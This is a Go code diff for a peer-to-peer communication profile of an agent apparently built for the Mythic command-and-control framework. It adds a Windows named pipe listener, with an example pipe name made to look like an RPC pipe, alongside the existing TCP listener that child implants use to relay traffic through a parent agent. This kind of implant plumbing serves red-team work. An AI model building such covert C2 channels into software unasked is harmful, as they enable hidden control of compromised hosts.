@@ -31,10 +31,11 @@ type sensitiveConfig struct {
 	CallbackUUID  string `json:"c"`
 }
 
-// TCPProfile handles TCP P2P communication with a parent agent or Mythic (via linked egress agent).
+// TCPProfile handles TCP or named pipe P2P communication with a parent agent or Mythic (via linked egress agent).
 // In P2P mode, this agent does NOT talk to Mythic directly — it sends/receives through a parent agent.
 type TCPProfile struct {
-	BindAddress   string // Address to listen on (e.g., "0.0.0.0:7777") — listener mode
+	BindAddress   string // Address to listen on (e.g., "0.0.0.0:7777") — TCP listener mode
+	PipeName      string // Named pipe name (e.g., "msrpc-f9a1") — named pipe listener mode (Windows only)
 	EncryptionKey string // Base64-encoded AES key (zeroed after SealConfig)
 	Debug         bool
 
@@ -70,8 +71,9 @@ type TCPProfile struct {
 }
 
 // NewTCPProfile creates a new TCP profile for P2P communication.
-func NewTCPProfile(bindAddress, encryptionKey string, debug bool) *TCPProfile {
-	return &TCPProfile{
+// pipeName is optional — if set, the agent listens on a Windows named pipe instead of TCP.
+func NewTCPProfile(bindAddress, encryptionKey string, debug bool, pipeName ...string) *TCPProfile {
+	p := &TCPProfile{
 		BindAddress:       bindAddress,
 		EncryptionKey:     encryptionKey,
 		Debug:             debug,
@@ -82,26 +84,43 @@ func NewTCPProfile(bindAddress, encryptionKey string, debug bool) *TCPProfile {
 		uuidMapping:       make(map[string]string),
 		parentReady:       make(chan struct{}, 1),
 	}
+	if len(pipeName) > 0 {
+		p.PipeName = pipeName[0]
+	}
+	return p
 }
 
-// Checkin performs the initial checkin via TCP.
+// Checkin performs the initial checkin via TCP or named pipe.
 // For a P2P child agent, this sends the checkin message to the parent agent who forwards it to Mythic.
 func (t *TCPProfile) Checkin(agent *structs.Agent) error {
-	// TCP child agents wait for an incoming connection from the parent (egress) agent.
+	// P2P child agents wait for an incoming connection from the parent (egress) agent.
 	// The parent connects to us via the link command, so we listen.
-	if t.BindAddress == "" {
-		return fmt.Errorf("TCP profile requires a bind address")
+	if t.BindAddress == "" && t.PipeName == "" {
+		return fmt.Errorf("P2P profile requires a bind address or pipe name")
 	}
 
 	var err error
-	t.listener, err = net.Listen("tcp", t.BindAddress)
-	if err != nil {
-		return fmt.Errorf("failed to listen on %s: %w", t.BindAddress, err)
+	if t.PipeName != "" {
+		// Named pipe listener (Windows only — stubs return error on other platforms)
+		t.listener, err = createNamedPipeListener(t.PipeName)
+		if err != nil {
+			return fmt.Errorf("failed to create named pipe listener: %w", err)
+		}
+		log.Printf("listening pipe %s", t.PipeName)
+	} else {
+		// TCP listener
+		t.listener, err = net.Listen("tcp", t.BindAddress)
+		if err != nil {
+			return fmt.Errorf("failed to listen on %s: %w", t.BindAddress, err)
+		}
+		log.Printf("listening %s", t.BindAddress)
 	}
-	log.Printf("listening %s", t.BindAddress)
 
 	// Wait for the parent agent to connect (with timeout)
-	t.listener.(*net.TCPListener).SetDeadline(time.Now().Add(5 * time.Minute))
+	// Only TCP listeners support SetDeadline; named pipe listeners handle timeouts via Accept context
+	if tcpL, ok := t.listener.(*net.TCPListener); ok {
+		tcpL.SetDeadline(time.Now().Add(5 * time.Minute))
+	}
 	conn, err := t.listener.Accept()
 	if err != nil {
 		t.listener.Close()
@@ -545,8 +564,10 @@ func (t *TCPProfile) acceptChildConnections() {
 	if t.listener == nil {
 		return
 	}
-	// Remove the deadline for ongoing accept
-	t.listener.(*net.TCPListener).SetDeadline(time.Time{})
+	// Remove the deadline for ongoing accept (TCP listeners only)
+	if tcpL, ok := t.listener.(*net.TCPListener); ok {
+		tcpL.SetDeadline(time.Time{})
+	}
 	for {
 		conn, err := t.listener.Accept()
 		if err != nil {
